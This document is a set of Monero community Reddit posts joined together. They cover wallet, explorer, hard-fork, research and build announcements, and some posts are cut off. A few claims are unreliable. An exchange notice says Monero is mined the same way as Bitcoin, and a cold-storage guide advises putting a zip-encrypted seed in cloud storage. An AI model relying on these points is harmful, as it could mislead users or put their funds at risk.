A year ago, [I introduced MoneroChain.com](https://www.reddit.com/r/Monero/comments/6b255d/ann_monerochaincom_a_prettier_blockchain_explorer/) - the result of a few weekends of hacking to produce a ""prettier"" block explorer. This was made possible by working with /u/mwo12 to develop a JSON API for the famous [onion-monero-blockchain-explorer](https://github.com/moneroexamples/onion-monero-blockchain-explorer) that powers popular explorers like [xmrchain.net](https://xmrchain.net).

Today, I'm happy to announce **[MoneroVision.com](http://monerovision.com)**, an even higher quality grade block explorer front-end for Monero powered by [MyCrypto](https://mycrypto.com). So far, MyCrypto has focused on Ethereum and Ethereum-like chains, but we're big fans of Monero and are excited to start building products for the Monero Ecosystem as well.

One area where Monero (and cryptocurrencies in general) need help is usability, so we wanted to make the MoneroVision Explorer UI as friendly as possible to users. 

Major differentiating features compared to existing block explorers include:

- Transaction confirmation estimations! Find out (roughly) when your transaction will confirm. 
- Custom node selection. For power users, you can run your own node and be confident there is no logging of what transactions you're viewing. Or, in the case that the MyCryptoAPI node is down, simply add an [onion-monero-blockchain-explorer](https://github.com/moneroexamples/onion-monero-blockchain-explorer) compatible explorer (including http://xmrchain.net) with our node selection tool, and you'll be back online!
- (Humbly) A really slick UI, with fancy loading animations and colors :)
- Mobile responsive. While most sites today claim to be mobile responsive, we've spent time to make sure our explorer is as usable on mobile as it is on desktop. I haven't found a mobile responsive monero explorer yet myself, so I hope this will be useful to all you mobile users!
- A Typescript + React codebase. Oh yeah, and MoneroVision is MIT licensed! Come check out our [GitHub](https://github.com/MyCryptoHQ/MoneroVision) and contribute!

Please feel free to tweet us [@MoneroVision](https://www.twitter.com/monerovision) or [@MyCrypto](https://www.twitter.com/mycrypto) with feedback, or just leave a comment here! 

We're excited to begin building services for Monero, and hope [MoneroVision.com](https://monerovision.com) will be useful for the Monero community! "
"Hi all,  
  
We would like to announce OpenBSD templates with complete firewall and Tor configurations. They are specifically designed for environments which require a high degree of security, privacy and anonymity. This makes them a good fit for crypto currency environments.  
  
These templates are just the first step. We plan to add templates for Monero and Kovri, but the current templates might already be of use to some. One basic use case would be to isolate your normal network from your crypto currency related systems.  
  
The firewall and Tor have sample configurations for Monero. You can configure the firewall to only allow Monero traffic to exit the network. The Tor configuration has samples on how to setup a Tor .onion service for a Monero node. This includes 'stealth' and 'next generation' onion services.  
  
This project is still in beta phase. Expect bugs, problems, etc. Lots of things still need a lot of love. But this is just the first step. We invite everyone to test, audit and improve the project.  
  
Our next step is to create a template for the Monero P2P daemon. The template should install and configure the Monero daemon with minimal input by the user. Plug-and-play is the goal. We haven't put much time into this yet, so suggestions or code are much appreciated.  
  
A (reproducible) binary on https://getmonero.org for OpenBSD or (reproducible) package in the OpenBSD repository would certainly make things a lot easier. Same goes for Kovri. We would actively promote and support such efforts.  
  
You can find more information about the project and our future plans on our website:  
https://garlicgambit.wordpress.com/2018/04/18/openbsd-templates-complete-firewall-tor-configurations/"
"Approximately the 9th of January there will be a hardfork on the Monero network. Most pools have upgraded or are in the process of upgrading, but some have not upgraded yet. If they don't upgrade before the hardfork they will get forked/booted off the network. As a result you will miss out on revenue if you are mining on these pools. Thus, if you are mining on one of the pools that hasn't upgraded yet or hasn't scheduled an upgrade, please contact your pool owner as soon as possible and urge them to upgrade. Alternatively, you can switch to a pool that is on the right version.

#**An important message for pool operators and miners**

From [MoneroMooo](https://bitcointalk.org/index.php?topic=583449.msg17295203#msg17295203):

>To all pool operators:

>If you haven't already, you will need to update the node-cryptonote-util software in order for your pool to cross the january fork. I think many of the pool ops have done so already, but for those who are not in #monero-pools, you will need this patch: https://paste.fedoraproject.org/506116/17116821/

>This applies to zone117x's version of the pool. There is a version of this ported to clintar's fork, which is here: https://github.com/M5M400/node-cryptonote-util/commit/37f50f9b535f0258c3a1c6f7247a891b4c211ff3. 

>If you're not running this when the fork happens, you will be forked off.

>For pool miners, you may want to check with your pool op that they're running the patch a few days before the fork, and switch to a known good pool otherwise. Please prefer smaller pools when doing so.

Also bear in mind that running v0.10.1 or the GUI beta is mandatory. Any other versions will get booted off the network. Thus, miners, please email your pools and ask them if they are running v0.10.1 and have applied aforementioned patch. 

#**General hardfork information**

The upcoming fork will enable Ring Confidential Transactions. This will significantly enhance Monero's privacy. Note that they will not be enforced yet. That is, this hardfork will enable them, whereas the hardfork of September 2017 will enforce them. If you want to read more about Ring Confidential Transactions, see:

https://lab.getmonero.org/pubs/MRL-0005.pdf

https://monero.stackexchange.com/questions/tagged/ringct

Due to variance the hard fork will likely be on the 9th or 10th of January. A specific block height was determined for the hardfork, not a specific date. The specific blockheight for the hardfork can be found [here](https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L92). That is:

>  // version 4 starts from block 1220516

**As an user you need to run either v0.10.1 or the Monero Core GUI Beta 1.**

------------------------

#**Monero v0.10.1 - Wolfram Warptangent - release**

First and foremost, please upgrade to this version. A blockchain resync is *not* needed. Only this version will work after the fork of January 5. Note that this fork will enable Ring CT transactions, but will not enforce them yet. 

## **Overview**

This is a necessary point release of Monero v0.10 ""Wolfram Warptangent"", and is highly recommended as it includes consensus-changing fixes to the RingCT implementation and various other bug fixes.

Some highlights of this release are:

* major changes to support the GUI
  
* adds full support for ""fluffy blocks"", a propagation improvement similar to Compact Blocks in Bitcoin Core
  
* adds in a dynamic fee system
  
* expansion of the data stored in the wallet cache, including the GUI address book
  
* switch to Borromean signatures in RingCT
  
* add Monero payment URI support to the wallet library
  
* complete overhaul of the threading system
  
* optimise the wallet blockchain refresh mechanism
  
* created a contributing guide
  
* switched to a dynamic dust threshold system
  
* added a command to compute the total coinbase
  
* major RingCT performance improvements
  
* killed off the old fast_exit mechanism, which caused more issues than anything else
  
* improved and fixed the cold wallet transaction signing mechanism
  
* overhauled the sweep_unmixable implementation
  
* fixed FreeBSD builds

##**Updating: Wallet Files**

Simply create a new directory with the 0.10.1 binaries and copy your wallet files over to there. Make sure to backup your wallet files properly. If you need any help, feel free to PM me or respond in this thread. Note that your wallet contains three files, namely wallet.keys (this is the most important file, since it contains your keys), wallet (this is the wallet cache, which contains your transaction history and private tx keys), and wallet.address (which is just your public address). In addition, if you incur a bug whilst upgrading, you can always restore your wallet with the mnemonic seed as follows:

For Mac and Linux:

`./monero-wallet-cli --restore-deterministic-wallet`

On Windows make sure to launch it from the command line. Go to the folder monero-cli-wallet is located and make sure your cursor isn't located on any of the files. Subsequently do SHIFT + right click and it will give you an option to ""Open command window here"". Lastly, type the following command:

`monero-wallet-cli.exe --restore-deterministic-wallet`

If you want to restore from the private keys instead of the mnemonic seed, replace `--restore-deterministic-wallet` with `--generate-from-keys`

"
"*Warning: No crypto or other excitement inside.*

I've been working on making the way the Monero command line tools are released better. This includes easier recipes for building on Windows, the ability to cross compile to any of the currently supported architectures and operating systems on a Linux, or macOS machine with [depends](https://github.com/monero-project/monero/tree/master/contrib/depends), ensuring that libraries used in Monero do not use proprietary components and making Monero binaries reproducible with [gitian](https://github.com/monero-project/monero/tree/master/contrib/gitian).

Then end goal of my project is protecting Monero from a [watering hole attack](https://en.wikipedia.org/wiki/Watering_hole_attack). A watering hole attack describes a class of attacks where a tool or binary that is used by a particular group of people is compromised. There are multiple ways to protect a binary from containing malicious, or unintended bytecode.

Foremost it is important to use dependencies that have been compiled from source during the build process. Dependencies should be taken from a source that publishes them directly. This ensures that no 3rd party distributor (software vendor), like sourceforge, who have a track record of shipping adware with its published binaries, messes with the binary in any way. This also lets you finely choose which version of the dependencies you want to use, to ensure you are patched against any recently discovered vulnerabilities of your dependencies.

In past releases Monero already did a decent job with this. The msys packages for windows and brew packages for mac can all be compiled from source. It is also important for a cryptocurrency that releases can be done as quickly as possible, and released binaries should be updated fast. Recent events have shown us, that the security of Monero greatly relies on getting patches out as quickly as possible.

Releasing patched binaries should not be a process that relies on a single, or a small group of developers all being available the entire time. Especially in a system that should be as anti-fragile as possible, developer up time should not be a guarantee. More people should be able to compile release builds of the Monero software and everybody should be able to verify that the release only contains the compiled source code.

Though the current Makefile in the Monero git repository contains commands like `make release-static` that should be able to do this, practice has shown that the process is confusing and people end up using wrong versions, or misconfigured dependencies (the good old *have you compiled with -fPIC?* spiel).

When I currently compile Monero version 0.13, my compiled binaries will be different from the published release binaries on [getmonero.org](https://getmonero.org). They will have different checksums, meaning I can not be sure if the binaries distributed there contain altered bytecode, or not. This is, because the tools used are not consistent with producing binaries. They place system paths, timestamps and debug symbols in different places of the bytecode depending on the system used. It is however possible to design systems in a way that produce binaries in a consistent manner. Bitcoin and tor use a system called gitian to achieve this. The process of doing this is called reproducible builds.

Reproducible builds allow many developers to collaborate on a build. Some projects have thresholds, where releases are only made when at least three independent developers have produced binaries with matching checksums. The process also allows users to make sure that the binary released is indeed consistent with the source code by matching checksums with the locally compiled binaries with those of the published binaries. When patches need to be released quickly, binary integrity can be proven at a later stage.

All the steps above already decrease the chance of a watering hole attack.

This scheme is still not perfect though. It requires a lot of manual interaction by both developers and users. Still, it does not eliminate all trust, since dependencies and compilers used still need to be trusted. In the end all it ensures is that binaries are compromised in the same way. Currently, there is research being done into 'Transparent Binaries', which would further improve the build environment and make it much easier for people to verify. Information on this can be found on the [mozilla wiki](https://wiki.mozilla.org/Security/Binary_Transparency) and this [paper](https://arxiv.org/pdf/1712.08427.pdf) by Tflow. "

"I'm here to inform the Reddit community about the excellent progress being made on the dedicated Monero hardware wallet.

As revealed during the Monero Community meeting earlier today, there is a working base edition prototype. **You can see some pictures of it here: [1](https://taiga.getmonero.org/media/attachments/3/3/1/3/b42a40438e4060866b8512d8a3392dab4a3f5687251df78d64147b2d59df/monerohwallet-20171111a.png) [2](https://taiga.getmonero.org/media/attachments/0/7/7/d/cfd39280215956baad3897f41fdf9dbb93b477db72ec57562cdd8ce6741a/monerohwallet-20171111b.png) [3](https://taiga.getmonero.org/media/attachments/9/d/2/3/e2e279662a7a602bda4c9fcca4da3a3238f4a1c108a46ad76123a7377d0e/monerohwallet-20171111c.png)**

**[Track all the progress on Taiga](https://taiga.getmonero.org/project/michael-rfc-hwallet-1-implementation/).** They will also give updates during the Monero Community meetings every other week.

Here are some quotes from msvb during the meeting:

> The board is demonstrated connected to a mobile phone over USB OTG, but eventually it may run on battery or even photovoltaic (solar) power.

> The team now consists of a handful of folks, some specialising in FPGA development, legal matters and documentation (a real attorney), core hw devs, and most important testers.

> I mention testers because if the current rate of development progress keeps pace, we'll be able to produce a handful (or more) of working boards soon for testing purposes.

> So whoever likes the idea of testing hardware (which is not useful for storing your real money please!) then sign up.

> You can read about the preliminary device delivery plans in:

> https://taiga.getmonero.org/project/michael-rfc-hwallet-1-implementation/wiki/preview

> ...and the main idea is simply become a member of the Taiga project, so you can contribute opinions and reports after testing.

> To do that, go to the main project page and click 'Contact the project'.

> https://taiga.getmonero.org/project/michael-rfc-hwallet-1-implementation/

> If you do this without being logged in, then make sure to provide your email address so we can invite you to be a tester.

> Otherwise, if you're already logged into Taiga, click the contact button and it goes more smoothly.

I am very excited for this project, and the work on it so far has been terrific!"
"bithumb trading is coming soon. !!!

Hello, 
This is Bithumb, the World’s Top cryptocurrency exchange. 
We are notifying our customers on the delay of listing Monero and regarding schedule. 

Due to extremely high volume of the market and also because abnormal actions have been detected in the Monero market, the listing of Monero has been inevitably postponed. 

We are very aware that our customers have waited for the event. 
However, the solid preparation has seemed to be much more necessary than listing the coin at this point. 

We deeply apologize for the inability to follow the announced schedule of listing Monero. And so we are now announcing the new schedule. 

Details of the event and the schedule can be found in the Event page, which will be opened soon. 

— 
Event 1. Get 1% of Monero that you Deposited and traded! 
Deposit Period: August 25, 2017 (Fri) 4 Pm, Deposit wallet address open ~ August 28, 2017 (Mon) 12pm (Noon) KST 
Trading Period: August 28, 2017 (Mon), Monero listed ~ August 31, 2017 (Thurs) 00 am (Midnight). 
Reward: Additional 1% of Deposited Monero during the Deposit Period. 

Caution : If there is no trading records during the Trading Period, the customer cannot participate in the event. 
※ Monero Listing Time as well as Rewarding Date will be notified on the Event Page. 
※ If the limit is reached the event can be ended without any announcement. 

Event2. Bithumb, Monero top Traders of the weekend 
Period: September 2, 2017 (Sat) 00 am ~ September 3, 2017 (Sun) 11:59pm 
Reward: To 50 biggest traders in terms of Trading Amount, prize will be rewarded . (100 Monero at Most) 

※ Top Traders Event Date will be notified on the Event Page. 
— 

We promise to try our best to safely list Monero on the exchange. 
We apologize for the inability to follow the announced schedule of listing Monero once again. 

Thank you. 

※ Monero (XMR) is structured and built for high privacy protection and anonymity. 
Its mining method is same as Bitcoin mining, and by CryptoNote implementations it is specialized in the protection of information."
"Heyo everyone, this little rant came from me seeing just one too many comments about what Monero isn't doing like other coins and market caps and all that.

Forgetting for a moment that Monero isn't trying to be like all the other pump and dump coins, I want to emphasize a huge point. Something so big that it's getting its own paragraph, will be in bold, and will have no fewer than three exclamation points.

**Monero is an open-source, community-driven project!!!!!**

What does this mean? It means if something isn't the way you want it to be in Monero (development, community, outreach), then change it. That's right. You. Not somebody else. Not the infamous 'they'. Let me let you in on a secret. 'They' don't exist. 'They' is you.

I first came to this community in January, and I think I understood that fairly quickly. I saw there wasn't a lot of marketing, and so I started /r/moneromarketing. Is it super busy right now? Nah, and I haven't had the time to try to make it so, since I did the next thing, started making a redesigned website (still in the works :D), because I didn't like the current one.

Let me clear another thing up right off the bat. You don't need permission from anyone to do things. Not fluffypony, not smooth, and not any of the core team. Heck, you don't even need permission from anyone in the community but you may experience resistance along the way, get used to that if nobody is onboard with your idea. If you can't get used to that, then quit. But don't whine about how nobody supports you or how people are mean to you. It's on you. You quit. You gave up. Nobody made you.

Look, not everybody liked my website designs. Not everybody was thrilled with me bringing up the 'marketing' conversation again when I did it. Did I care? No. I did it anyways. They're a bunch of idiots (no offense :P). And I'm an idiot. We're all little idiots with different ideas trying to make an ideal into a reality.

Last thing, specifically regarding marketing. I don't know why we want the devs to market Monero. They're coders and devs. Not marketers. Unless marketing it's their strong point, it will probably not be a great campaign. XD 

Last last point, if you haven't worked to contribute to this project, at the VERY LEAST financially to help a FFS, then you have ZERO room to complain. None. You're riding on the coattails of other people's hard work, and crying when it's not going how you'd like. If you say, ""Oh, but rehrar, I don't know HOW to get involved since I'm not a coder."" Message me. Right now. I'll get you started on something. No excuses now. ;)

So yeah. End rant. Stop whining, get involved. 

Love you all. Happy to be in this particular group of idiots that wants to change the way the world does privacy.

"Hi All,

We just crossed a great milestone for Cake Wallet....the magical 10,000 number of unique installs at the Apple App Store!  This is truly incredible that a wallet for the 10th largest coin by market cap (per coinmarketcap.com) and only on one OS can attract this much activity.

Thanks to my amazing dev team who is never afraid of a challenge led by DrM4nhattan and KnifeofPi2.  Thanks also to the many members of this community who have helped us and guided us - you know who you are! 

To give back to the community and to promote Monero, I am sponsoring members from the Monero community to come speak at our NYC Meetup.  We already did a successful one with Diego which was a huge success.  More to come and hopefully on a monthly basis.

Your donations are much appreciated to keep the development moving forward. Please donate XMR to:

"Hello,

I'm an iOS dev and a relatively active member of the community.

I reviewed the current src at GitHub and think the Cake wallet src looks good.

Didn't see anything nefarious there, code is well written.

This post does not represent a guarantee/warranty for Cake wallet, that said I just wanted to share my thoughts on it.

Particularly the handling of seed/wallet generation is done well using secure keychain:

You can follow the protocol from here: https://github.com/fotolockr/CakeWallet/blob/d52390ac8a4672d167ec3b0adf8b628bd10f6502/CakeWallet/Domain/Wallets/Wallets%2BWalletsCreating.swift"
"Next to hardware wallet support (which doesn't exist yet), here is a simple way to store Monero in a somewhat secure manner. We will use a live Linux session in case your Windows system is infected, and we will use a USB stick for easy portability. note: this requires a 64 bit pc.




**1)** Buy a 16gb-32gb usb stick (64GB-128GB if you don't want to use a remote node, and want to sync the whole blockchain, which is ~44GB)


**2)** Create bootable Ubuntu stick: https://tutorials.ubuntu.com/tutorial/tutorial-create-a-usb-stick-on-windows


**3)** Boot to the USB stick (doing this will vary depending on your machine, consult your owners manual for how to get to the ""boot menu"") and run a ""Live Session"" of ubuntu (choose ""Try Ubuntu"" when it boots up)


**4)** Once we are sure the USB can boot into Ubuntu, go ahead and reboot into Windows. Because the USB installer takes up the entire contents of the storage (even thought Ubuntu only requires 4GB to run), we basically need to resize the Ubuntu partition to about 4gb, and then create another partition for the remaining unallocated space where we will store our wallet. 

So download EaseUS Partition Master Free Edition from here http://download.easeus.com/free/epm.exe, install it in Windows. Then open it and youll see your drive as ""UBUNTU 16_0"". Right click and choose ""Resize/Move Partition"". Drag the slider on the right, over until the ""Partition Size"" is down to about 4000 MB (You can leave ""optimize for SSD"" unchecked)

Now, youll see the ""UBUNTU 16_0"" partition is now down to 4gb, and whatever is leftover is labeled as ""Unallocated"". Right click the ""Unallocated"" partition and select ""Create Partition"". For the label, put ""Persistent Storage"" (or whatever you want). For ""Create As"", put ""Logical"". For ""File System"", put EXT3. Where it says ""Decide size and position"", either leave as is to use the entire unallocated space, or drag the slider if you want to leave room for another partition (bear in mind EXT3 can only be accessed with linux).

In the top left, click ""APPLY"", then Yes to confirm. 

*after this is finished, windows will ask you to format the drive before you can use it. Always select NO! This is simply because windows does not recognize the EXT3 filesystem.*

Now reboot and you should be able to run the Live Ubuntu session, and you should see the persistent partition as a separate drive.


**5)** Download Monero GUI (https://dlsrc.getmonero.org/gui/monero-gui-linux-x64-v0.11.1.0.tar.bz2) and extract it to the new partition you just created.


**6)** Run ""monero-wallet-gui"" and create a new wallet. Make sure to specify Wallet Creation Height of 1,520,000 (or whatever the most recent block height is) and make sure to protect it with a STRONG password that you will NOT forget. *This is the only thing protecting your wallet in case your USB is lost/stolen.*


**7)** Be sure that the wallet is created and saved in the new new persistent partition we created in Step 4. *If you store it in the Ubuntu OS partition, as soon as you power down the machine, that wallet will be gone forever.*


**This is possibly the most important step**
**8)** Make sure to write down your 25 word seed and keep it somewhere safe in case of emergency. For an added layer of redundancy just in case your house burns down or something, paste the 25 words into a text file, save it to the Ubuntu Live OS partition, then right click > compress, change file type from "".tar.gz"" to "".zip"" and then enter a STRONG password. Some people argue against this next step, however if you lose ALL your phsyical devices, if you upload this encrypted ZIP file to your cloud storage host of your choosing, MEGA, dropbox, drive, etc, then you'll at least be able to recover your funds. *Don't forget to delete the original text file after you encrypt it.*


**9)** Let your wallet sync (will take days most likely if you're going to run your own node) **OR** use node.xmr.be:18081 and the sync will take considerably less time.


**10)** Once the wallet says ""Connected"", grab your public address from the ""receive"" tab, and send yourself some Monero. Congrats you now have your money stored on a USB.



**NOTE**: It really is best practice to delete, and then restore your wallet from the 25 word seed, at least once, before sending money to it. This ensures that you are able to restore the wallet if the need arises. However this step is not entirely necessary, just make damn sure you copy that seed down correctly.

**NOTE2**: You can follow this same process using Tails and Tails Persistent Storage to leverage the anonymity of Tor, however I recommend UBUNTU for new Linux users.


Comments and suggestions are appreciated. If you have issues with any of the steps just leave a comment and I will respond. Will edit this as needed"
"Can be found [here](https://forum.getmonero.org/9/work-in-progress/89004/funding-for-surae-at-mrl-for-q1-2018?page=&noscroll=1#post-94078), but copypasta below:

Hello again, everyone. Thank you all for your patience in my delayed end-of-2017 update for MRL: my family and I had some emergency health issues (so December was less productive than I had hoped) and then I had to bounce out to Zurich for a week to go to the Real World Crypto conference with Fluffypony and friends (so I was again delayed in January). 

**MRL Announcements** We are still having weekly Monday meetings at 17:00 UTC. These are one-part research meetings, where we update the community on our work, and one-part ""office hours"" where we answer questions, help new people in Monero, etc. I've missed the past several meetings (see my excuses above) which I feel a bit terrible about. I am happy to entertain format suggestions regarding these meetings. They can always be improved, and sometimes I feel like I'm just describing all my recent shower thoughts to a mostly empty room.

_POW Difficulty Replacement Contest_: After discussing with several community members, we are putting this on hold for a few months. I still think this is a good idea, but I believe we have higher priorities right now. Right now I am shooting for such a contest to be funded by 1st June 2018, for submissions to be accepted in July, August, and Septebmer 2018, and for a winner to be announced (or all submissions announced as losers lulz) by 1st December 2018. _My initial plan is to match up 10% of donations_ up to around $2000-4000 USD (worth of Monero) so that the prize could be quite substantial. If all submissions are losers, we can either run a second round of the contest, or send the funds to the monero general fund, or donate it all to the Pineapple fund or something. However, given how things seem to be going, maybe we should be expecting to begin in September or something like that.

**WTF Happened in the past 45-ish days?**: Rundown for December and January.

_Multisig_: Because of this paper, I've decided to just start tripling my expected time-to-completion for everything. Because apparently I am not super great at estimating time of completion. This took up the majority of my time becuase I constantly felt ""almost done,"" so I didn't want to work on anything else. 

The vast majority of January I spent working on the multisig paper, correcting mistakes, going through code review. I believe I spent around 120 or 135 hours working on this in December and January together. The current version can be seen [here](https://www.sharelatex.com/read/bfjfkdgnhgvh)... there are two major remaining components for this paper: first, the attack section of the paper has been temporarily commented out, and second, the code review needs to be re-reviewed (all explanations of the code need to be fleshed out and triple checked). I expect each of these (the attack section and the code appendix) to take between 25 and 30 hours of work, totalling 50 to 60 hours before completion of the multisig paper (translation: I really think I'll be done with this before the end of the week, but I'm afraid it will take the rest of the month).

_RTRS RingCT, column linkability, amortization_: Still chatting with soon-to-be-Dr. Ruffing about these. Expect more information about this by the end of January.

_Bulletproofs_: We are currently discussing how to go about auditing/vetting bulletproofs. Sarang and I both agree that the math looks good, Sarang and Moneromooo both believe the code is rather tight, and we have had some optimizations suggested by various folks. As I mentioned on Reddit just the other day, we are sort of faced with a dilemma here: either we implement bulletproofs for the Spring hard fork or not, and each decision has a cost. The cost of not implementing bulletproofs will, over six months, amount to around six hours of additional download+sync time for new nodes. This cost is in adoption rate, and is certain to occur. On the other hand, the cost of implementing bulletproofs too soon, is Monero's double spend protection, and is not certain to occur. Since one of these is catastrophic but may not occur, and the other is kinda terrible but is certain to occur, we have a tradeoff to consider here. We are being cautious. Expect a statement from us about this in the coming days.

_Monero Standards_: No progress has yet been made on these, although much of the documentation in the multisig paper will make it into the RingCT component of the Monero Standards, so there is a nice overlap there.

**Remainder of January and leading into February**: I am attending BPASE18 with Sarang, Fluffypony, and all you other crazy bastards. In addition to this, I am merely finishing the multisig paper by the end of January. For those of you keeping track of hours, I plan on working 50 hour weeks for the remainder of January and for all of February so that my delayed payment for December does not bleed into the end of the ""quarter.""

Any time I have leftover in January above and beyond multisig will go into one of the following: 1) the ZK literature review by Jeffrey Quesnelle (author of the recent Zcash linkability paper), 2) working on my SPECTRE code (the blockchain concensus algorithm, not the recent exploit), or 3) network simulations for independent verification of the difficulty assessment computations of zavvy12 from [here](https://github.com/monero-project/research-lab/issues/3) (if you are curious, I have some not-yet-functional code gluing Poisson processes together [here](https://github.com/b-g-goodell/research-lab/tree/in-prep/source-code/Simulator)). 

**What about the rest of the year?**:

_First Quarter Roadmap_: This is being delayed until the end of January if not a bit longer. This is partly becuase this first quarter roadmap is really an ""2018 whole-year roadmap,"" and partly because all of the delays I have personally recently experienced. In addition to this, after speaking with fluffypony in Zurich, I am going to look into:

_Fee structures_: Using time series analysis, I believe it will be a fairly straightforward task to develop a long-term plan for our fee structures based on empirical connections between fees and network activity. These connections are, of course, _correlative_ not causative and, moreover, would be computed assuming absence of attacks. However, this would provide us some sort of long-term empirical plan for our fee structures (compared, for example, to eyeballing/arbitrarily setting base fees each hard fork). This would provide us an easy target to point at when we hear fee complaints in the future... a statement like ""our fee model disagrees with you, so unless you have a better forecasting model than ours, or a specific attack model in mind, your criticism is empirically unjustifiable"" would be absolutely invaluable against feeFUD.

Side note on this: Anyone willing to get me as much historical Monero network and pricing data as possible in this regard will be doing me a huge favor in saving me time. I can analyze data quickly, I can curate a data set slowly. Due to this, I do not plan on spending any of my time actually gathering any of this data before February: if someone hands me a data set, I will analyze it happily. When I say ""as much data as possible,"" I'm not kidding around. Average number of transactions per block, average fee paid per transaction, average kb per transaction, number of inputs per transaction, number of outputs per transaction, average time between blocks, USD/XMR and EUR/XMR and CNY/XMR and BTC/XMR exchange rates and exchange volumes at the time of each block for many exchanges... these are all obvious, but even silly stuff like ""number of cryptocurrencies listed on each exchange at each block time"" is nontrivially helpful information. 

_Educational outreach_: I have something semi-secret brewing that I hope can be included in my end-of-Februrary announcement. It's probably a badly kept secret (many many folks in Zurich have given me their thoughts), but putting it in writing here seems to be perhaps unwise until I speak with a few more folks about how to handle all of it. My initial plans for Sarang were to organize a 2018 summer school at some willing university, but it appears that was too ambitious (we are shooting for summer 2019 now for this), so we have pivoted a little bit to this new idea... anyway, details will be forthcoming over the coming weeks.

**THANK YOU ALL.** This is the best opportunity anyone like me could possibly hope for. I am pretty sure Sarang feels the same way. The Monero community has so far proved to be extremely generous. I really do my best to avoid concluding that a decision was good just because the outcome was good, you know? But kicking the traditional economy to the curb in favor of this opportunity has been absolutely the best outcome of my life so far, and I fear I couldn't possibly explain to everyone, even face to face, how much all of this means to me. 

At the risk of mimicking the first season of Silicon Valley... thanks for giving me the opportunity to make the world a better place."

"I just got a native Android build working https://github.com/monero-project/monero/pull/1968

Binaries are available on http://highlandsun.com/hyc/monero.android.armv8.v0-10-3-1-beta-9ed496b.tar.bz2 sha256sum a88006df058fffe13cd70ccf19fa9d148100e5df53920afa79b2707d157213c4

You don't need root to use it. You *should* only use it on a device that has removable storage - I still don't know what DB wear-and-tear does to the lifetime of a smartphone's internal storage.

You will need some kind of terminal program on your device. I use Connectbot. You will have to extract the archive into a directory under /data/local/tmp - that's the only place in a non-rooted device where you'll have execute permissions.

I have a 128GB microSD card in my phone, residing at /storage/sdcard1. So I create a /storage/sdcard1/monero directory for my data directory, and I create a /data/local/tmp/monero directory for the binaries. Then just cd /data/local/tmp/monero; ./monerod --data-dir /storage/sdcard1/monero

^^^^ slight update - You can only write to /data/local/tmp if you're using the adb shell. If you use Connectbot, you can use /data/data/sk.vx.connectbot instead. Whatever terminal program you use, it will have a directory matching its package name under /data/data. But you'll have to find the actual name of the package (e.g. ""sk.vx.connectbot"") instead of just the name Android shows you. And you can't just get a listing of everything under /data/data - regular users don't have read permission there.

... previously I was running a binary built for Debian ARM64. But that required installing a complete Debian OS onto my phone to use it. Worked well enough, but a rather heavyweight solution. https://www.reddit.com/r/Monero/comments/5jla9w/hacks_monero_wallet_cli_on_rooted_android_for/

Much cleaner now as a native Android build.

Build instructions for both 32 and 64 bit Android now posted https://forum.getmonero.org/5/support/87643/building-monero-v0-10-3-1-for-android"
What is up with this recent increase of the hash rate? It has almost doubled in a matter of days. Has any particular reason for this been confirmed yet?
"Hey Moneroans!    
This short guide wants to help who would like to know more about Monero and it's environment. It's aimed to beginner developers and for people with scarce IT background, but willing to learn.    
First of all, we all know Monero is a Cryptocurrency, that ""crypto"" says us it's something about cryptography, so **what is cryptography?**
&nbsp;

on [learncryptography.com](https://learncryptography.com/) you can find a lot of info in few lines, nothing too deep or techy, just enough to understand what cryptography is about (main subjects: Encryption, cryptanalysis, cryptocurrency, mathematics, steganography, computer security)    
&nbsp;

Right, but i guess you also read here and there something about **cryptonote**, the protocol used by Monero.     
[Here](https://cryptonote.org/inside.php) a deep, but easy to understand, explanation with pictures of Cryptonote. If you want to learn more just read [the white paper with annotations](https://downloads.getmonero.org/whitepaper_annotated.pdf), made by our [research lab](https://lab.getmonero.org/). 
&nbsp;

We also know that Monero is all about privacy, **why is privacy so important?**    
[Privacytools.io](https://privacytools.io) is a very good (and open) source of informations and tools to use to better understand and enhance your privacy, also /r/privacy worth a visit.

##Let's talk about programming languages now!
Monero is Written in many languages, i collected some of my to-go places/repository that are helping me to get in the world of coding and network security

###platforms where you can learn coding with a practical approach for free: 
 + [Codecademy](https://www.codecademy.com) 
 + [learn-C](https://www.learn-c.org/) - This is helpful for who has already an idea of how programming works. if you are starting from 0, i suggest to visit the next section first (contains documents and tutorials)
 + [Learn-Cpp](https://www.learn-cpp.org/) - Like above, but for C++
 + [Introduction to Cryptography by Christof Paar](https://www.youtube.com/channel/UC1usFRN4LCMcfIV7UjHNuQg/videos) (YouTube)
 + [Cybrary](https://www.cybrary.it/) Free and Open Source Learning for Cyber Security, IT and more
 + [edx.org](https://www.edx.org/course/subject/computer-science) - Many interesting courses from various universities (Harvard, MIT, ecc)
&nbsp;

[here](https://www.openhub.net/p/monero/analyses/latest/languages_summary) a complete list of languages used by Monero
###Awesome lists

Down here i collected an incredibly comprehensive list of books, tools, other lists or resources about network security

+ [Security list for fun and profit](https://github.com/zbetcheckin/Security_list) - a lot of categories and lists. a lot
+ [Free Programming books](https://github.com/EbookFoundation/free-programming-books) - free books in all the main languages. this is one of the most popular repository on github
+ [Awesome security](https://github.com/sbilly/awesome-security) - A collection of awesome software, libraries, documents, books, resources and cools stuffs about security.
+ [frontend dev bookmarks](https://github.com/dypsilon/frontend-dev-bookmarks)

## Monero Time!

### Git/GitHub
Monero's code [lives on GitHub](https://github.com/monero-project). This guy tend to be scary for who doesn't code, but it's really not. If you give a look to the many repository you will definitely find something you would like to contribute to, don't stop because you don't know how to use GitHub!    
the contributor guides for every repository are in:   
 
[Monero](https://github.com/monero-project/monero#contributing) - the daemon   
[Monero-core](https://github.com/monero-project/monero-core/blob/master/README.md) - the Graphic User Interface   
[Monero-site](https://github.com/monero-project/monero-site/blob/master/README.md) - website    
[Kovri](https://github.com/monero-project/kovri-docs/blob/master/i18n/en/contributing.md) - Kovri

&nbsp;

the problem is that **GitHub** has limited features, if you want full control of your work you should learn to use git. **Git** allows to make a local clone of a repository, for example 'Monero', make your change locally and then push them to your remote repository on GitHub. Once this is done you can wait for reviews on your repository or ask to integrate your changes in the main repository (in this example 'Monero'), making what is called a Pull Request.    
All this can look scary, but it's really not, once you get the flow.    
&nbsp;

For **info about GitHub and how to use it**, check [here](https://guides.github.com/activities/hello-world).  [Here](https://rogerdudler.github.io/git-guide/) for an easy to understand guide for Git, and [here](https://www.atlassian.com/blog/git/simple-git-workflow-simple) a basic workflow. If you prefer a video tutorial, [youtube](https://www.youtube.com/results?search_query=github+tutorial) can surely help us. At last, [this cheat sheet](https://github.com/tiimgreen/github-cheat-sheet) can come handy.

"Hi All,

